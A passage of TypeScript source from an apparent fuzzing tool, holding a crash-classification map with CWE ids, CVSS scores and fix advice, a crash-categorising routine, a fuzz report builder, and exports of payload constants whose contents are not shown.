      cvss: 5.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L',
      rec: 'Add resource limits (file descriptors, connections). Implement circuit breakers.',
    },
    unhandled_error: {
      type: 'unhandled_error', severity: 'low', cwe: 'CWE-391',
      cvss: 2.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N',
      rec: 'Add proper error handling. Never ignore errors silently.',
    },
    double_free: {
      type: 'double_free', severity: 'high', cwe: 'CWE-415',
      cvss: 7.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
      rec: 'Null pointers after freeing. Use RAII/unique_ptr. Avoid free in multiple paths.',
    },
    use_after_free: {
      type: 'use_after_free', severity: 'high', cwe: 'CWE-416',
      cvss: 7.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H',
      rec: 'Null and guard pointers after release. Use static analysis to detect dangling references.',
    },
    buffer_overflow: {
      type: 'buffer_overflow', severity: 'high', cwe: 'CWE-120',
      cvss: 8.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H',
      rec: 'Use bounds-checked functions (strncpy, snprintf). Enable compiler stack canaries.',
    },
    integer_overflow: {
      type: 'integer_overflow', severity: 'high', cwe: 'CWE-190',
      cvss: 7.5, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
      rec: 'Use safe integer arithmetic libraries. Check for overflow before operations.',
    },
    toctou: {
      type: 'toctou', severity: 'medium', cwe: 'CWE-367',
      cvss: 5.5, vector: 'CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N',
      rec: 'Use atomic file operations (O_NOFOLLOW, open+fstat+mmap). Avoid check-then-use patterns.',
    },
    race_condition: {
      type: 'race_condition', severity: 'high', cwe: 'CWE-362',
      cvss: 7.0, vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H',
      rec: 'Use proper synchronization (mutexes, atomic operations). Avoid non-atomic check-then-act.',
    },
    redos: {
      type: 'redos', severity: 'medium', cwe: 'CWE-1333',
      cvss: 5.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L',
      rec: 'Use non-backtracking regex engines. Set regex timeout limits. Validate regex patterns.',
    },
    xxe: {
      type: 'xxe', severity: 'high', cwe: 'CWE-611',
      cvss: 8.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N',
      rec: 'Disable external entity processing. Use safe XML parsers with XXE protection.',
    },
    decompression_bomb: {
      type: 'decompression_bomb', severity: 'medium', cwe: 'CWE-409',
      cvss: 5.0, vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L',
      rec: 'Limit decompression ratio. Use streaming decompression with size limits.',
    },
  };

  // Determine crash category from result
  let crashCategory = 'unhandled_error';
  if (result.signalNumber === 11) crashCategory = 'segfault';
  else if (result.crashType?.includes('panic')) crashCategory = 'panic';
  else if (result.crashType?.includes('stack')) crashCategory = 'stack_overflow';
  else if (result.crashType?.includes('memory') || result.crashType?.includes('OOM')) crashCategory = 'memory_exhaustion';
  else if (result.timeoutDetected) crashCategory = 'timeout';
  else if (result.crashType?.includes('resource')) crashCategory = 'resource_exhaustion';
  else if (result.crashType?.includes('double_free') || result.crashType?.includes('double free')) crashCategory = 'double_free';
  else if (result.crashType?.includes('use_after_free') || result.crashType?.includes('use after free')) crashCategory = 'use_after_free';
  else if (result.crashType?.includes('buffer') || result.crashType?.includes('overflow')) crashCategory = 'buffer_overflow';
  else if (result.crashType?.includes('integer') || result.crashType?.includes('wraparound')) crashCategory = 'integer_overflow';
  else if (result.crashType?.includes('toctou') || result.crashType?.includes('TOCTOU')) crashCategory = 'toctou';
  else if (result.crashType?.includes('race')) crashCategory = 'race_condition';
  else if (result.crashType?.includes('redos') || result.crashType?.includes('ReDoS')) crashCategory = 'redos';
  else if (result.crashType?.includes('xxe') || result.crashType?.includes('XXE')) crashCategory = 'xxe';
  else if (result.crashType?.includes('decompression') || result.crashType?.includes('bomb')) crashCategory = 'decompression_bomb';
  else if (result.exceptionDetected) crashCategory = 'exception';

  const info = crashMap[crashCategory] || crashMap['unhandled_error'];
  return {
    crashType: info.type,
    severity: info.severity,
    cweId: info.cwe,
    cvssScore: info.cvss,
    cvssVector: info.vector,
    recommendation: info.rec,
  };
}

// ============================================================
// FUZZ REPORT BUILDER
// ============================================================

export function buildFuzzReport(
  target: FuzzTarget,
  totalCases: number,
  results: FuzzResult[],
  durationMs: number,
): {
  summary: Record<string, unknown>;
  crashes: Array<Record<string, unknown>>;
  recommendations: string[];
} {
  const crashes = results.filter(r => r.crashDetected);
  const exceptions = results.filter(r => r.exceptionDetected && !r.crashDetected);
  const timeouts = results.filter(r => r.timeoutDetected);

  // Group crashes by signature for deduplication
  const uniqueCrashes = new Map<string, FuzzResult[]>();
  for (const crash of crashes) {
    const sig = crash.crashSignature || crash.crashType || 'unknown';
    if (!uniqueCrashes.has(sig)) uniqueCrashes.set(sig, []);
    uniqueCrashes.get(sig)!.push(crash);
  }

  const crashReports: Array<Record<string, unknown>> = [];
  for (const [signature, crashGroup] of uniqueCrashes) {
    const first = crashGroup[0];
    const analysis = analyzeCrash(first!);

    crashReports.push({
      crashSignature: signature,
      crashType: analysis.crashType,
      severity: analysis.severity,
      count: crashGroup.length,
      cweId: analysis.cweId,
      cvssScore: analysis.cvssScore,
      cvssVector: analysis.cvssVector,
      firstIteration: first!.iteration,
      reproductionInput: typeof first!.input === 'string' ? first!.input : JSON.stringify(first!.input),
      stackTrace: first!.stackTrace,
      recommendation: analysis.recommendation,
    });
  }

  return {
    summary: {
      targetType: target.type,
      totalIterations: totalCases,
      totalCrashes: crashes.length,
      uniqueCrashes: uniqueCrashes.size,
      totalExceptions: exceptions.length,
      totalTimeouts: timeouts.length,
      crashRate: totalCases > 0 ? ((crashes.length / totalCases) * 100).toFixed(2) + '%' : '0%',
      durationMs,
    },
    crashes: crashReports,
    recommendations: [
      'Implement input validation for all externally-controlled inputs.',
      'Add proper error handling with try-catch or equivalent.',
      'Set resource limits (timeouts, memory, file descriptors).',
      'Use safe parsing libraries with built-in protection against common attacks.',
      'Consider using fuzz-resistant design patterns (e.g., length-prefixed data).',
      'Run coverage-guided fuzzing with minimizeCrashInput on any discovered crashes.',
      'Use computeCrashSignature to deduplicate crashes across fuzz runs.',
    ],
  };
}

// ============================================================
// EXPORTS
// ============================================================

export {
  INTEGER_BOUNDARIES,
  UNICODE_PAYLOADS_EXTENDED,
  FORMAT_STRING_PAYLOADS_EXTENDED,
  JSON_PAYLOADS,
  XML_PAYLOADS,
  REGEX_PAYLOADS,
  INTEGER_WRAPAROUND_VALUES,
  FLOATING_POINT_EDGES,
};
